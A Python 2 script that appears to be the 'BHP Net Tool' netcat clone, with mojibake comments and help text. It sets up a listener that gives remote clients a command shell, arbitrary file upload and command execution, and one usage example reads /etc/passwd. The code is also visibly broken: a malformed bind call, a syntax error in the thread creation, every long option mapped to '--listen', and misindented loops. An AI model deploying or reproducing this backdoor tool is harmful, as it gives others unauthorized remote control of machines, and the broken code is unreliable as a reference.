import sys
import socket
import getopt
import threading
import subprocess

#�w�q�@�ǥ����ܼ�
listen  = False
command = False
execute = ""
target  = ""
upload_destination = ""
port = 0

def usage():
    print "BHP Net Tool"
    print
    print "�Ϊk: bhpnet.py -t target_host -p port"
    print "-l --listen                    - �b [host]:[port] ��ť�s�J�s�u"
    print "-e --execute=file_to_run       - ����s�u�ɰ�����w�ɮ�"
    print "-c --command                   - �ҰʩR�O�C shell"
    print "-u --upload=destination        - ����s�u�ɤW���ɮרüg�X[destination]"
    print
    print
    print "�d��:"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def client_sender(buffer):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        #�s��ؼХD��
        client.connect((target, port))
        
        if (len(buffer)):
            client.send(buffer)
            
        while True:
            #�M�ᵥ��Ʀ^��
            recv_len = 1
            response = ""
            
            while recv_len:
                data    = client.recv(4096)
                recv_len= len(data)
                response+= data
                
                if recv_len < 4096:
                    break
                
                print response, 
                
                #���ݧ�h��J
                buffer = raw_input("")
                buffer += "\n"
                
                #�ǥX�h
                client.send(buffer)
    except:
        print "[*] Exception! Exiting."
        
        #��s�u
        client.close()
        
def client_handler(client_socket):
    global upload_destination
    global execute
    global command
    
    #�ˬd�W��
    if len(upload_destination):
        #Ū�J�Ҧ�bytes�üg����w��m
        file_buffer =""
        
        #�@��Ū��S����Ƭ���
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
                
        #�M��յۧ�o�Ǹ�Ʀs���ɮ�
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            #�^���ڭ̽T����Ʀs���ɮפF
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
            
    if len(execute):
        #������w
        output = run_command(execute)
        client_socket.send(output)
        
    if command:
        while True:
            #��ܤ@��²�檺����
            client_socket.send("<BHP:#> ")
            #���۫��򱵦����, ���즬��LF(Enter��)
            cmd_buffer = ""
            
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                
            response = run_command(cmd_buffer)
            
            #�^��
            client_socket.send(response)
            
            
        
def server_loop():
    global target
    
    #�Y�S�w�q�ؼ�, �N��ť�Ҧ�����
    if not len(target):
        target = "0.0.0.0"
        
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target.port))
    server.listen(5)
    
    while True:
        client_socket, addr = server.accept()
        
        #�Ұʤ@��thread�B�z�s�Τ��
        client_thread = threading.Thread(target=client_handler, args=(client_socket,)))
        client_thread.start()
        
def run_command(command):
    #��������Ÿ�
    command = command.rstrip()
    
    #������O�è��^��X
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "���O���楢��\r\n"
    #���X�Ǧ^�Τ��
    return output

    
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
        
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
        
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--listen"):
            execute = a
        elif o in ("-c", "--listen"):
            command = True
        elif o in ("-u", "--listen"):
            upload_destination = a
        elif o in ("-t", "--listen"):
            target = True
        elif o in ("-p", "--listen"):
            port = int(a)
        else:
            assert False, "�ﶵ���B�z"
            
    #�ڭ̭n��ť, �٬O�u�O�qstdin�ǰe���?
    if not listen and len(target) and port > 0:
        #�q�R�O�CŪ�Jbuffer
        #�o�|block,�ҥH�p�G�S���n�z�Lstdin�Ǹ�ƪ���
        #�n��CTRL-D
        buffer = sys.stdin.read()
        
        #���ưe�X�h
        client_sender(buffer)
        
    #�ڭ̭n��ť, �P�ɥi��ھڤW�����R�O�C�ﶵ�W�ǪF��,������O, �δ���shell
    if listen:
        server_loop()
        
main()
    
    
    